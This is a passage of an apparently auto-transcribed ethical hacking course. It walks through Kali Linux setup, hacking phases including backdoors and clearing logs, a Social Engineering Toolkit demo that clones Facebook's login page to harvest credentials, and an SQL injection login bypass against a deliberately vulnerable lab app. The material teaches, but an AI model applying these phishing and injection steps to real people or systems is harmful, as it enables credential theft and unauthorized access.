scan applications and identify flaws
within those applications as well now
all of these are automated tools the
essence of ethical hacker is when these
tools churn out the reports the ethical
hacker can understand these reports
analyze them identify the flaws and then
craft their own exploits or use existing
exploits in a particular manner so that
they can get access or they can bypass
the access or security controls
mechanisms that are already in place how
can they do that with the tool called
metasploit you see that big m there on
the right hand side that m logo is for a
tool called metasploit which is a
penetration testing tool what is a
penetration testing tool it is that tool
that will allow a ethical hacker to
craft their exploits or choose their
exploits for the vulnerabilities that
have been identified by nessus since we
are interacting with computers we will
always be interacting using tools right
so the first tool nessus identifies the
flaws and the possible list of
vulnerabilities we do a penetration test
using metasploit to validate those flaws
and to verify that those laws are
actually exist and try to figure out the
complexity of those flaws and that's
where metasploit helps us do that
wireshark would be used in the
background while we are doing both the
activities using nessus or metasploit to
keep a track of what packets are being
sent and by received on the network
which will help us analyze those packets
so whenever i run an ss scanner i would
run a wireshark in the background it
will capture the data packets and i can
go through those data packets and
analyze that data package to identify
what nessus is actually trying to do
similarly when i try to attack a machine
using exploit on metasploit i will keep
on wireshark running in the background
to capture the data package that have
been sent and the responses that i have
received from the victim so that i can
also go through those packets and
analyze the responses and analyze the
attack whether it was successful to what
extent was it successful and
basically will also give me a validation
of proof of the activity that has
happened nmap is another automated tool
that allows me to scan for open ports
and protocols so why would i use nmap
because pro ports and protocols become
an entry point for a hacker to gain
access to devices for example when we
connect to a web server we connect to a
web browser but we automatically connect
to port 80 using http and port 443 is
using https so if i'm connecting to a
web server using https it is safe to
assume that port 443 on the web server
is open to accept those connections
similarly there would be other services
that may be left open on the web server
because nobody thought about configuring
it or they misconfigured the web server
and they left unwanted services running
so nmap will allow me to scan those
ports and services and allow me to
understand what services are being
offered on that server so then i can
start analyzing that server identify
those flaws within those services and
then try to attack them if the
application that i'm analyzing is
connected to a database and i want to do
a sql injection attack or if i if nessus
tells me that there is a sequel
injection attack that may be possible on
that particular application i can use an
automated tool called sql map or sql map
that would allow me to automatically
craft all the queries that are required
for a sql injection attack and help me
do that attack at the same time so here
i do not have to manually create my own
queries the sql map tool would
automatically create them for me what i
would do is i would use nessus to
identify that particular flaw if
necessary for that flaw i would then go
use the tool sql map configure it to
attack that particular web server and
when i fire off the tool it will then
automatically start directing queries
sql injection queries to the database to
see if those databases are vulnerable
and if yes what data can be retrieved
from those databases so all of these
tools in a nutshell would help me hack
networks applications operating systems
and host devices and this is what an
ethical hacker does they use these kind
of tool sets they identify what attacks
they need to do they identify the right
tool for that particular attack and they
write their exploits they create those
attacks and then they start attacking
analyze the response and then give a
report to the management providing them
feedback about how the attack was
created or crafted what was the response
to that attack and whether the attack
was successful or not if successful they
would also give recommendations of what
to do to prevent these attacks from
happening in the future so when we are
doing these attacks or when we want to
launch these attacks what is the process
that we would follow so there are six
steps that we would do as an ethical
hacker if you are just a hacker you
probably wouldn't do the sixth step
which is a reporting step so the first
step that would be done is the
reconnaissance phase which is the
information gathering phase which is
very important from ethical hackers
perspective or a hacker's perspective
because if i want to attack someone or
something as a digital device i need to
know what i'm attacking i need to know
the ip address of the device the mac
address of those devices i need to know
the operating system the build or the
version of that operating systems
applications on top the versions of
those applications so i know what i'm
attacking for example if i if i want to
attack a server i assume it's a windows
based server and i use a particular tool
to attack it but it actually turns out
to be a linux based server my attacks
are going to be unsuccessful so i need
to focus my attack based on what is
there at the other end so in my
information gathering phase i want to
identify all of that information once i
have that information done i'm going to
scan those servers using tools like nmap
that we just talked about and we're
going to try to see the open ports open
services and protocols that are running
on that server that can give me possible
entry points within the network or
within the device or within the
operating system at the same time along
with the scanning with nmap i would run
a vulnerability scanner the nexus
vulnerability scanner we talked about or
acunetix for applications and then i
would try to identify vulnerabilities in
those applications operating systems or
networks once i have identified those
vulnerabilities in the scanning phase i
would then move on to the gaining phase
where i would then craft my exploits or
choose existing exploits and start
attacking the attacking the victim at
this point in time if my attack is
successful i will probably have gained
access
by either tracking passwords or
escalating privileges or exploiting a
vulnerability that i may have found
during the scanning phase once i have
gained my access i want to maintain my
access why because the vulnerability may
not be there for long maybe somebody
updated the operating system and hence
the flaw was no longer exist or existing
or somebody changed the password that we
had i may have cracked does i no longer
have access so what do i do to maintain
my access i install trojans or backdoor
entries to those systems using which i
can secretly in a covert manner get
access to those devices at my own will
at my own time as long as those devices
are available over the network so that's
where i maintain my access i have hacked
them now i want to maintain my access so
i install a software which would give me
a backdoor entry to that device no
matter what once i have done this i want
to clear my track so whatever activity
that i've been doing for example
installing a trojan a trojan is also a
software that would create directory
directories and files once installed on
the victims machine so i want to hide
that if i have access data stores if i
have modified data i want to hide that
activity because if the victim comes to
know that something has happened they
would start they would start increasing
their security parameters they might
start scanning their devices they may
take them offline thus my hack would no
longer be efficient the reason i'm
clearing my tracks is that the victim
doesn't find out that they have been
hacked or they have been compromised or
even if they do find out that they've
been compromised they cannot trace the
compromise back to me so i would be
deleting references of any of the ip
addresses or mac addresses that i may
have used to attack that particular
device and this is where i will be able
to identify where those logs were
created where those traces are once i
take off those traces the victim would
not be any wiser of whether they have
been compromised or who compromised
their system and if i am successful at
all of these stages or what to whatever
extent the success that i've achieved in
any of these stages i would then create
a report based on that and i would
report to the management about the
activities that we have been able to do
and whatever we have been able to
achieve out of those activities for
example we identified 10 different flaws
there were 20 different attacks that we
wanted to do what attack did we do what
was the outcome of that attack what was
the intended or or the expected output
of that attack i'll create a report
which would give a detailed analysis of
all the steps that were taken along with
screenshots and evidences of what
activity was conducted what was the
output what was the expected output and
i would submit that report to the
management giving them an idea of what
vulnerabilities and flaws exist in their
environment or their devices that need
to be mitigated so that the security can
be enhanced so these are the six steps
that the ethical hacking process would
take uh just going through this the uh
reconnaissance is where you're going to
use hacking tools like nmap hp to obtain
information about targets there are
hundreds of tools out there depending on
what information you want then in
scanning again nmap nexpose these kind
of tools to be utilized to identify open
ports protocols and services in gaining
access you're going to exploit the
vulnerability by using the metasploit
tool that we talked about in the
previous slides in the maintaining
access you're going to install backdoors
you can use metasploit at the same time
you can craft your own scripts to create
a trojan and install it on the victims
machine once you have achieved that
clearing tracks is where you're going to
clear all evidences of your activity so
that you do not get caught or the victim
doesn't even realize that they have been
hacked and once you have done all of
this we are going to create reports that
are going to be submitted to the
management to help them understand the
current security evaluation of their
organization so now let's see how we can
hack using social engineering now what
is social engineering social engineering
is the art of manipulating humans into
revealing confidential information which
they otherwise would not have revealed
so this is where your social skill and
your people skills come into the picture
if you are able to communicate
effectively to another person they would
probably give up more information that
they intended to give out let's take a
look at examples right if you see on the
screen fishing activity what is phishing
we receive a lot of frequents on a
regular basis we have always received
those emails where we have won a lottery
of a few million dollars but we have
never realized that we didn't purchase a
lottery to win a lottery in the first
place we have always had those nigerian
frauds where a prince died in some south
african country and u out of seven
billion people on the planet have been
identified where they want to transfer a
few hundred million dollars through your
account and they want to give you 50 of
that money in return as thank you so
some very basic attacks where you go on
to websites and there's a banner
flashing at you saying congratulations
you're the one millionth visitor to this
website click here to claim your price
all of these are social engineering
attacks phishing attacks fake websites
fake communications being sent out to
users to prey on their gullibility most
of humans always have that dream of
striking it rich winning a huge lottery
once and for all and living their life
lavishly ever after but sadly in the
real world that's not that doesn't
happen that often and if you're
receiving those meals it is very
important that you first research the
validity of those those communications
before you even want to act upon them so
why are humans susceptible to social
engineering because humans have emotions
machines do not try pleading with a
machine to give you access to a account
that you have forgotten a password to
the machine wouldn't even know what
you're doing try pleading with a human
sympathy or empathy where you could try
to create a social engineering attack
where you can plead with them saying if
i do not get access to this account
immediately i might lose my job and then
that would put my family into problems
somebody would feel empathy or simply
towards you and help you reset that
password and give you access to that
account it's how good the attack is and
how convincing you are for the success
of this attack to happen so what is a
familiarity exploit attackers interact
with victims to gain information which
will benefit the attackers to crack
credentials as passwords if we want to
reset our passwords what do we have as a
mechanism to resetting passwords we have
some security questions that we set up
those questions are nothing but personal
information that we would know but
through a social engineering attack it
would be easily be able to uh gather the
information that you have set for your
security questions the security
questions can be as simple as the first
school that you attended you probably
have that listed on your linkedin
profile where a person can just go in
there and see your academic
qualifications and identify the school
that you're in right similarly it might
also be a question what was your
mother's maiden name that's a very good
attack and that's uh i mean if a person
can interact with you let's say they are
trying to take a survey and they
approach you for a feedback on a
particular product that you have been
utilizing and they ask you these
questions you wouldn't think twice
before giving those answers as long as
the request sounds legitimate to us we
are able to justify that request we do
answer those queries so it's upon us to
verify the authenticity of the request
coming in before we answer it phishing
as discussed would be fraudulent emails
which appear to be coming from a trusted
source so email spoofing comes into mind
uh fake websites and so on so forth
exploiting human curiosity curiosity
killed the cat right so there was
there's so many physical attacks where
hackers just keep pen drives lying
around in a parking lot now this is an
open a generic attack whoever falls
victim will fall victim so if i just
throw around a few usbs in the parking
lot obviously with trojans implemented
on them some people who are curious or
who are looking for a couple of freebies
might take up those pen drives plug them
in their computers to see what data is
on the pen drives at the same time once
they plug in those pen drives on their
computers the virus or the trojan would
get infected and cause harm to their
machine then exploiting human greed we
just talked about the
nigerian frauds and the lotteries those
kind of attacks the fake money-making
gimmicks now basically this is where you
prey upon the person's uh greed kicking
in and they are clicking on those links
in order to get that money that has been
promised to them in that email so one of
the safest mechanism to keep data
private and to keep yourself secure is
using encryption now encryption can
happen through cryptography what is
cryptography cryptography is the art of
scrambling data using a particular
algorithm so that the data becomes
unreadable to the normal user the only
person with the key to unscramble that
data would be able to unscramble it and
make sense out of that data so we're
just making it unreadable or
non-readable by using a particular key
or a particular algorithm and then we're
going to send the key to the end user
the you end user using the same key
would then decrypt that data if anybody
compromises that data while it is being
sent over the network since it is
encrypted they would not be able to read
it so the encryption algorithm would be
something like this now if you see uh
the computer word once made into
unreadable format would
look like e q o r x v gt for an end user
it wouldn't make any sense but the
person who has a key to unscramble that
would be able to convert it back to
computer and then understand the meaning
of that word so this is just a
substitution cipher that is being shown
on the screen so what is the alphabet
the key is alphabet plus three so c plus
three alphabets that becomes e o becomes
q m becomes o so the key that is
utilized to scramble the data is the
character that you are at the third
character from there would be the
corresponding key so the encrypted
message is also known as a cipher the
decryption is just the other way around
where you know the key now and you can
now figure out what that e corresponding
to by going back three characters in the
alphabet most of the times a certified
ethical hacker must decrypt a message
without knowing the secret key so let's
say a ransomware has affected your
organization or has affected a device
and you want to figure out uh or you
want to decrypt that data now as an
ethical hacker you wouldn't be for
paying a ransom to the hacker would you
so it is now your prerogative of how
you're going to work around and how
you're going to try to crack the
encryption mechanism how to crack the
cipher to decrypt that message and see
what's within it right decryption
without the use of a secret key that is
known as a cryptanalysis cryptanalysis
is the reversing of an algorithm to
figure out what the decryption was uh
without using a key so cryptanalysis can
be done using various formats the first
one is a brute force attack second is a
dictionary attack the third one is a
rainbow table attack a brute force
attack is trying every combination
permutation and combination of the key
to figure out what the key was it is 100
successful but may take a lot of time a
dictionary attack is where you have
created a list of possible encryption
mechanisms a list of possible cracks and
then you try to figure out whether those
cracks work or not rainbow tables are
where you have an encrypted text in hand
and you're trying to figure out uh the
similarities between between the text
that you have and the encrypted data
that you wanted to decrypt in the first
place so in the brute force attack
you're trying every possible combination
permutation of what the key would be in
dictionary attack you have a word list
that would tantamount to the key and if
you're trying to match all the words
listed in the text file or the word list
to see if any of those words are going
to work to decrypt that data here in the
rainbow table the cipher text is
compared with another cipher text you
find out similarities and then you try
to work or reverse engineer your way
accordingly so let's have a quick demo
on cryptography before we begin this
session so to begin with the demo of
cryptography we are on our website
called spammic.com which will help us
scramble the message that we created
into a completely uh format which would
be unrelated to the topic at hand so if
i say i want to encode a message i turn
a short message into spam so what this
does is i want to send across a secret
message you type in the secret message a
short one it will convert that into a
spam mail you send it across so whoever
is reading that spam mail would never
get an idea of the embedded message
within it so if i want to type in a
message here hi this is a secret message
the password is asd at the rate one two
three four and i want to send this out
to people or to one of my colleagues but
i want to send it out in a secret manner
so that others are not aware of this so
when i press on encode what the
algorithm would do is it will convert
this message into a spam mail so my
message hi this is a secret message the
password is at the rate one two three
four or asd at the rate one two three
four gets converted into this now if you
read it dear e-commerce professional
this letter was specially selected to be
sent to you this doesn't make sense
there is nowhere or no reference to the
actual message that i've already said so
if i copy this entire message and i send
it let's say via email to the recipient
now the thing is that the recipient
needs to know that i've encoded it using
spam mimic the algorithm remain needs to
remain the same so once they know that
it is spam mimic what they can do is now
in this instance what i'm going to do is
i'm going to open up a new browser and
i'm going to go to the same website and
at this point in time i'm going to click
on decode when i click on decode i'm
going to paste the message that i have
just copied there we are and this
message is now being copied into a
different browser and if i decode this
you will see that it will convert it
back to the original message that there
was so the key is there at spam mimic
and it is embedded within the message so
whenever we paste the message in the
decode factor it knows what the key was
and it can decrypt that message and give
me the actual message that was embedded
within it there we are the entire
message this is what we created in the
google chrome browser and in the firefox
browser we decoded similarly if i want
to protect these kind of messages there
is an aspen encrypt.com website where
let's say we use text encryption and i
want to encrypt the same message
this
is a secret message the password is asd
at the rate one two three four and then
i give it a password to protect this
message let's say the word password and
i use the cipher to scramble this by
using let's say aes which is the
strongest cipher right now and i say
encrypt so this is what the encryption
would look like and basically if i don't
have the password over here if i decrypt
it you would see that the error has
occurred if i type in the password over
here and then decrypt it it will be able
to convert that back into the
unscrambled text and it will give me
what the original message was this is a
secret message the password is asd at
the rate one two three four so if i want
to keep my data secure from hackers i
want to scramble it in such a way that
they would not be able to crack it or it
would be very difficult for them to
crack it and this is one of the first
mechanisms that would be recommended by
any ethical hacker to keep the data
secure now let's talk about downloading
and installing kali linux along with
that we'll also be looking at the basic
commands that are required for kali
linux all right so i've opened my
browser and we want to go to the kali
website so we want to go to
kali.org you can directly type in
kali.org and go to the website i can
just do a google search and say kali
download and it will give you the same
website but it will directly take you to
the downloads pages so either here and
or you can go to the home page uh
cookies are being installed on your
machine so uh see which cookies you want
to allow i'm only going to use the
necessary cookies to support this site
and you can see that this gives you the
latest kali linux news and tutorials
gives you the latest release what is in
that release and gives you a lot of
documentation which will help you
understand what tools have been
developed and what functionality has
been given in the latest version if you
want to download you can directly go
here and you can download kali linux now
kali linux is a 2.6 gigabyte download so
it's going to take time the latest
version being 2019.4
and we click over here i'm using a
download manager to manage all these
huge downloads and you can see it's
pointed to the operating systems folder
and it is going to be a 2.57 gb download
so you click on download and in the
background uh you can see this is going
to be downloaded and you're going to
minimize this and
it will take a few minutes for that to
download but this is an iso image so we
need to install it on a virtual machine
so what we need is we need to use a
hypervisor which will allow us to create
virtual machines so we can either use
vmware workstation which you can
download from here however uh this is
paid version so you can see it is around
250 or something for
this software but it is a very good
software to have so if you click on
download now it is going to start the
download it's a 30-day trial period if
you want to use it after 30 days you'll
need to enter the key which you'll get
after purchasing the software if you do
not want to utilize this the free
version that you have you can either
download vmware player but there are
some limitations for vmware player that
you might want to look at does you want
to compare these products before you
want to purchase them right otherwise
you can download oracle virtualbox which
is a free hypervisor it's not as robust
as vmware workstation but it does the
trick right so the the free version 6.1
is free and you can then create your own
virtual machines over there and install
operating systems on them what i do have
i already have a vmware workstation
installed so i'm just going to open that
up and that's my vmware workstation as
you can see i already have a lot of
virtual machines created over here what
we are going to do is we are going to
configure a virtual machine for the kali
linux operating system that we are
downloading which should be somewhere
here let's see it's at 43 percent so
halfway there till then let's create the
virtual machine so i click click on file
create a new virtual machine i'm going
to customize the machine so click on
next this little default we don't want
to change that and then we want to
install the operating system later we
don't want to point it out right now so
i'll just click on i will install the
operating system later click on next we
want to install linux now in the drop
down you would not see kali linux over
here however you can choose ubuntu
64-bit that's what i'm going to choose
there it is next
what is the name that we want i want to
give it kali linux without the typo and
i want to store it in one of the folders
that i've created by default it stores
on the c drive which is not a good place
to store uh you don't want to run out of
space on your c drive so i'm going to
click on this pc and
this is my data and in here i'll have a
folder called virtualbox or virtual
machines there it is within which you
can see the other software that i
already created i'm going to create a
new folder and call it kali 2019 l l for
it is latest for me because you can see
already have a kali linux so i'm just
going to identify this folder with the l
at the end going to select it and click
on ok you can see the path being changed
over here click on next it's going to
ask you how many processors now
depending on the processor that you have
you can see i've got a 8 core i7 so if i
give it 16 cores or 16 processors that's
not going to work i cannot go beyond
what the physicality already is so for
this machine one processor with one core
is more than enough if you're going to
load use a lot of tools at the same time
you might just want to give it two cores
so given it two cores it will ask us for
ram to be provided for this virtual
machine by default 2048 megabytes that's
2gb of ram is more than enough if you
require more we can change this later on
so click on next we want to use nat for
now leave this default next whatever is
recommended keep it the way it is we do
not want to change it next create new
virtual hard disk for this machine and
it is going to ask us the size 20 gb is
more than fine store it as a single file
you don't want to use multiple file
options click on next and then click on
browse wherever you want to store the
vmdk file or the virtual hard disk file
and we go back again to the same folder
that we had created virtual machines and
we look at the kali linux kali 2019 l
and we want to store the vmdk file over
there once we save it we want to click
on next and then we want to click on
finish so this is the virtual machine
that has been created right here right
now this is the basic configuration now
where are we at with the operating
system and you can see the operating
system has been downloaded and it is
stored in this particular folder so you
go to e drive so we are looking for the
sub the operating system that we have
downloaded we downloaded in the
operating systems folder and if we go in
here you can see the current one the
kali linux 2019.4
iso right here so what we do we go back
to the kali linux machine that we have
created edit virtual machine settings
and we point this virtual machine using
the cd dvd and then we point the iso the
one that we downloaded over here so we
go back to e drive we go back to os and
we click on kali linux 2019 click on
open so now when this boots up it will
boot up with this iso and then it will
allow us to install the operating system
so click on ok then we click on power on
this virtual machine it will start
powering on it will boot to the iso and
it will start giving us the booting
options so i'm just going to
enter the full screen mode over here for
this to be better visible and we don't
want the live mode what we want is we
want to use the graphical install and
then we highlight that we press enter
and you can see the setup starting up
we'll wait for the gui to pop up there
it is which language do we want for now
we want english click on continue where
are we located click on continue and the
configure your keyboard we want the us
keyboard american english
continue it is going to detect the
hardware so as you can see on the screen
it's attempting a auto configuration for
most of these settings the network with
dhcp it has identified the network cards
uh hardware like uh the processor that
has been provided but is asking for a
host name we're going to leave it at
default we're going to click on continue
domain name i'm not joining this into a
domain as yet there's going to be a
standalone machine so i can leave this
blank click on continue now it is going
to configure the network it is asking
for a password at this point in time the
root password type in any password that
you want ensure that you remember the
password now by default the username for
the account is the name is the word root
we are just creating the password for
the root account and then we want to
click on continue setting up the clock
looking at the hard disks now here it
asks us do we want to use the entire
disk the 20gb virtual hard disk that we
had provided or do we want to give it a
manual configuration or a guided one
where we want encryption and a logical
volume management coming into the
picture we're just going to use the
first option guided you use entire disk
don't worry it's only going to use the
virtual disk that we had created click
on continue it will give us that it's a
21.5 gb vmware virtual disk that we had
and click on continue all files in one
partition that's what we want
recommended for new users whatever it is
we don't want to change these folders
continue and this is what we have
configured once we click on continue it
is going to say you are you sure you
want to make these changes click on yes
click on continue and it will start
installing kali linux on your device now
this is going to take a few minutes for
the installation to work all right so
that's the installation that's completed
now it's asking us to configure a
package manager a network mirror can be
used to supplement the software that is
included on the installation media this
may also make new versions of software
available you want to use a network
mirror we can click no for now and then
click on continue now this is going to
install the grub bootloader this might
take a few minutes as well install the
group grub loader to the master boot
record yes click on continue click the
hard disk that you have just utilized
this is the one click on continue it
will install the grub boot loader
running through the last phases of the
installation and now it says the
installation is complete we want to
click click on continue finishing the
installation and then it will do a
reboot all right and you can see this is
starting up so you are going to use you
just wait out the boot and now it
started the booting sequence just going
to maximize the screen and you can see
it's asking me for the password this is
the one that we created now that's the
that's not the password that's the
username that's the root and the
password that we had created at that
point in time and then click on log in
and this is your screen
now what we need to do here is we need
to install vmware tools
which will help us manage the screen and
help the virtual machine to be a little
bit better integrated on the system so
that's
not mounted yet so we're just waiting
for it to mount there it is and what we
want to do here is open vmware tools
upgrader all right so what we want is we
want to extract or we want to use this
open x archiver and once we do that
we'll see the vmware install dot pl
double click on that all right we've got
the vmware tools here what i've done is
we have extract 2 and i've extracted
that on the desktop right so what we
just did was click on the desktop over
here open and this is what it will do
and click on extract now there is
happening because i've already extracted
this open this up we want to run this
vmware install dot pl so what do we do
we open up the terminal window which is
the command line interface over here and
now this is where some of the commands
come into the picture so for example pwd
will show us the present working
directory ls will show us the list of
the folders that are there so the folder
that we have is on our desktop so we'll
just change directory to desktop press
enter do an ls that will show us the
list and you can see vmware tools
distrib that's the folder that we have
right here right so we want to go into
that folder see the vmware at this point
you can just click on tab and it will
populate everything over there press
enter do an ls and we want the vm where
hyphen install dot pl to be executed all
right so we tried executing that command
we had an error over there so what we
need to do is we need to execute this
command so dot slash vmware and hyphen
install.pl and we'll start creating now
uh it will ask you for your input
installing vmware tools in which
directory do you want to install the
binary files uh by default it is going
to see you slash usr slash bin if i just
press
enter it is going to use the default as
you can see the input over here what
directory do you want the init
directories i'm just going to press keep
on pressing enter for the defaults to
come in this part does not exist it is
going to create it default yes defaults
everywhere and then it's twice to start
initializing it to maximize the screen
and this is where it is installing and
you can see by just installing that it
automatically adjusted the screen and
now we got a full screen of kali linux
right here right and that is what vmware
tools does for us once we have installed
the operating system and now you can see
the entire screen on here you will see
the tool sets that are given here now
why are we using kali linux in the first
place because this comes in uh with a
bundle of thousands of softwares that
are ready to be utilized for ethical
hacking right and they have been
categorized over here for information
gathering vulnerability analysis web
application analysis and so on so forth
so you can see from forensics onwards
reporting tools and as you scroll down
you can see your development tools
graphics coming in internet and the
system configuration coming into the
picture these are your settings for your
operating system so these are basically
your tools we are right now the
favorites if i click on information
gathering you will see that other tools
for information gathering start
appearing over here for vulnerability
analysis we have got sparta and map
fuzzing tools web application analysis
we have got comics skip fish sql map
database assessments password attacks
and so on so forth so if we just go in
the favorites this was the terminal
emulator that we utilized is the command
line that we saw we used the cd command
we use the pwd command we did the ls
command as well to give us the list of
the directory that we are in similarly
there would be commands like cat so
let's go to cd downloads let's see what
the uh what's there they can see this
case sensitive so if i type in a capital
d and then do a tab ls there's nothing
over here on download so cd dot dot will
take us back one directory now you can
see we are back from downloads to root
if i want to go to desktop this is how i
go to desktop do a ls you can see the
vmware tools uh folder over there cd
vmware tools and we go into that folder
ls which will give us the list of all
those files now you can see install is a
file that we had edited back then so if
i do a cat install you will see the cat
basically is the command that will help
us look at the contents of the file all
right without opening up the file
without editing the file so you can see
just uh if i scroll up this is where we
give the cat command it then
printed the contents of the file over
here and then it exited and gave me back
to command line right here right now if
i want to copy this cp root desktop
vmware install and if you want to copy
it to root downloads and press enter now
what we are going to do is we are going
to see if this file the install file
that we just edited over here has been
copied to the downloads folder so we do
us we are currently in the vmware on the
desktop vmware tools district folder
video cd dot dot that takes us down one
directory so we are still in the desktop
do a cd dot dot now you can see we are
back in the root and now we are going to
do a cd downloads do an ls and you can
see the copied file right here so if i
do a cat install you can see the same
content of that file coming in so these
are some of the commands that we would
need to learn as we go ahead the remove
command is
let's say we've got install we do a man
rm man is the manual page command that
gives us the pages with the description
of how that particular command is to be
utilized so rm is remove files or
directories synopsis is the description
the options hyphen f4 hyphen i for
prompt hyphen capital i prompt once
before removing more than three files
and so on so forth if you want to exit
this you can
press q to exit and you come back to
this page so if i say rm install ls you
will see that the install file has now
been deleted so in windows we use the
del del command in linux it is the rm
command so this is what we wanted to
look at the demo for kali linux how to
download it how to install it and some
of the basic commands that we can
utilize all right let's begin with the
fishing
tutorial we have the kali linux
operating system booted up over here uh
what we are going to do is we are going
to open up a tool called set social
engineering toolkit which you would find
in this option and that's the tools that
we want it's a command line tool a menu
driven tool we are going to host a fake
facebook page and you can see how we can
harvest credentials by this kind of an
attack so these are some disclaimers you
might want to go through that do you
want to agree to the terms of service
yes
press enter and that's your social
engineering toolkit and we are talking
about a phishing attack which can comes
under the social engineering attack so
it like i said it's a menu driven tool
so we just have to look at these options
and then just type in the number of the
option that we want so we want to do a
social engineering attack so i type in
one press enter and that it is asking me
whether i want a spear phishing attack a
website attack vector we are going to
choose a second option so i type in two
press enter and then it asks me uh what
i want to do i want to take the third
option here credential harvester attack
methodology and we want to do the third
attack now it is asking whether we want
to use the in-house website templates
that it already has or do we want to
clone a site or do we have a customized
site that we have prepared that we want
to migrate into this tool we are going
to do the site cloning option so we're
going to type in two press enter and
then it is going to ask me the ip
address where it wants to capture and
store the credentials by default this is
the ip address that i'm using so if i
leave it blank it will take my default
ip address so i'm just going to press
enter and now it is asking me the url to
clone so i type in
https www.facebook.com
what it is going to do it is going to
connect online and it is now you just it
has cloned the website uh facebook
login.php the best way to use this
attack is that you if you use the if the
username and password form are in the
same field or the same page regardless
this captures all posts on a website so
you may need to copy www.star into html
depending on where your directory
structure is press return if you
understand what we are seeing here so
press enter the social engineering
toolkit credential harvest attack is
running on port 80 information will be
displayed to you as it arrives so the
site was
71.134 right the default ip address and
this is where the website is being
hosted let's check that out so let me
open up a browser on my host machine and
uh let me point it to the kali linux
machine that we have just created
192.168.71.134
and you should see a login to facebook
coming up right here looks genuine it is
genuine because we just went online and
downloaded this let's just have a recap
let's have a explanation of what we are
trying to do i am trying to host fake
facebook page on my server which has an
embedded script in it which is going to
do credential harvesting so the attack
here is let's say if i'm now hosted this
i can craft a fake email send it across
to a victim saying uh your facebook
account has seen some unforeseen
activity create a hyperlink using html
coding within that click here to access
your account and verify uh that the
account is secured and when they click
on that link they will be redirected to
my fake page which is here you can see
the ip address is my virtual machine's
ip address but i'm seeing a facebook
login page and i'm going to type in
someone at
somewhere.com and the password i'm just
going to type in the regular ones that i
use and if you see it when we typed in
uh the username and password the page
just refreshed and gave us the login
page again but now if you look at the
url i'm actually on facebook's login
page which is exactly the same that i
was hosting so a layman wouldn't
probably figure out they've been hacked
by now they just would figure out okay
they probably typed in the incorrect
password and the page refresh or
something like that and they're just
going to log in and they're actually
going to access the facebook page thus
they might not even realize that
something went wrong but if i go back to
my virtual machine you can see that it
has captured some data and it is
reporting over here of what has happened
so if i just scroll up let's see what
happened here and if you have been able
to capture anything so we gotta hit
printing the output this does the http
1.1 200 okay response coming in password
field phone
and
we just looking there it is email
someone at somewhere.com and
uh password that i typed in asd at the
rate one two three four so it has
captured the username and the password
right here uh once you're done i mean
this is the way attackers work now this
is a very basic attack again uh in the
actual trainings you would then look at
how you would host this on a real
website make it a global attack right
now it's a virtual machine with a class
cip address so here the thought process
is where can we get a free hosting where
we can host this kind of sites maybe
i'll have to purchase a domain which
looks like similar to facebook or the
victim that i'm trying to attack so this
is just a poc so we just wanted to find
out if we can uh how phishing is done
and this is exactly how it is done right
so pressing control c would exit this
tool and takes you back to the actual
menu
99.99
99 press
and there it is close the two window and
that's
the phishing practical after fishing
let's talk about sql injection sql
injection stands for uh structured query
language injection which is a database
attack though it resides within the
application so it's the application
vulnerability that we are trying to uh
look at to try to bypass authentication
as the name suggests a sequel injection
vulnerability allows an attacker to
inject malicious input into a sql
statement what is a sql statement a
query that is used by an application and
is fired off to the database database
executes that query gets that
information that is required and sends
it back to the user if the user is
authenticated so we're going to look at
the sql injection attack demo here and
what we are going to do is we are going
to go back to our vmware workstation and
i have got a tool over here called ovasp
broken web application which is a
utility that has been created for people
like us to test our skills to learn on
how we can develop our skills further so
this has a lot of vulnerable
applications built within it we're just
going to try to access it and we are
going to see if we can create a sql
injection attack he's just waiting for
it to boot up once it boots up it will
give us an ip address there we are so we
need to connect to 71.132
so i can just use the same browser i was
using close up facebook and now go to
192.168.71.132
and this is the ovap broken web
application project uh what we're going
to do is we're going to go to utility
and this is a application that has a lot
of information within it you can see it
gives you links about what you should do
help me video tutorials listing of
vulnerabilities that they have and so on
so forth so you can see we are not
logged in right now i'm just going to do
this as a demo so what we are going to
do is we are going to look at this and
bypass authentication so we are taken to
the login page where you need a username
and password to log in i'm going to type
in test as the username and test as the
password click on login and you can see
that account does not exist so the
authentication mechanism works now what
we want to do is we want to create a
query now what does a query look like
when i type in a username and a password
if i just type in a single quote here it
is going to create an error and this is
what the sql query looks like select
username from accounts where username is
a single quote and then the exception
error happened so it's not showing the
rest of the query to us now what i'm
going to do is i'm just going to craft a
query here a single quote and give it a
condition or one equals one space hyphen
hyphen space what happens hyphen hyphen
space is comments out anything after
that so the password field is being
commented out at this point in time and
i'm just giving it a condition where the
condition is true one does equal one and
if this condition is true it is going to
allow me to log in so you can see right
now we are not logged in this bypasses
the authentication mechanism and you can
see user authenticated and we are now
logged in as admin so uh in the training
what we need to understand uh as a whole
is how sql works what are the queries
that are structured with how you can
what are the testing operators now the
single quote that we used that was an
operator in the sql syntax what these
operators are how they function and then
how we can leverage these attacks there
are different tools that are given to
you in kali as well that you can utilize
so in kali linux you can just open up a
command prompt and there's a tool called
sql map you need to give it a particular
site so sql map hyphen u for the url and
whatever the url is now url here and
then once you're here you just press the
enter key this tool will craft all the
queries in the background for you you
don't even have to no sql query or sql
languages
this is a very easy tool to utilize
sadly i cannot demo this on a live
website because that would be illegal
but you can
see how you can operate this yourself
that's what sql injections are all about
moving on we now talk about
uh vpn's virtual private networks and a
virtual private network is basically a
secure network that allows me to
anonymize myself over the internet so
what i'm doing is i'm connecting from
here to a server that encrypts my
channel encrypts my connection and does
allows me to keep my data secure now the
basic essence of a vpn or a virtual
private network is to allow me this
encryption mechanism where i can encrypt
and safeguard my data the added
advantage that nowadays a vpn gives is
that you can allow us to spoof our ip
address or obfuscate our ip address so
we can actually become anonymous on the
internet it can allow us to use multiple
ip addresses and does
secure ourselves on the internet for
example i use vpn called cyberghost and
what this allows me to do is it allows
me so many servers over here and if you
look at the entire list all the servers
then there are no spy servers which and
guarantee me that they are not going to
keep and store any logs and thus they
are not going to record any of the
activity that i'm doing right since they
are located out of romania this becomes
a little bit more safer for me because
the government and the laws over there
are a little bit more relaxed than other
countries uh they give me different
links for torrenting for streaming for
connection features so there are a lot
of vpns out there so for example let's
go to the website
cyberghost.com so we can see there's a
sale going on 76 percent sale or you can
go on to express vpn which is also very
good vp and then there is not vpn it
depends on what you want and how you
want to utilize it so just purchasing a
vpn or getting a free free vpn is not
enough it depends on which country the
vpn originates from and which server
you're connected to for example most of
the countries have a pact where they
share information amongst themselves
even if you're connected to a vpn that
means that these companies that provide
these services have to generate and
store logs and these logs have to be
reported to the government if they ask
for it now if there's a list of 14
countries that actually uh focuses on
this practice so you have to find out
vpn that and a server that is not a part
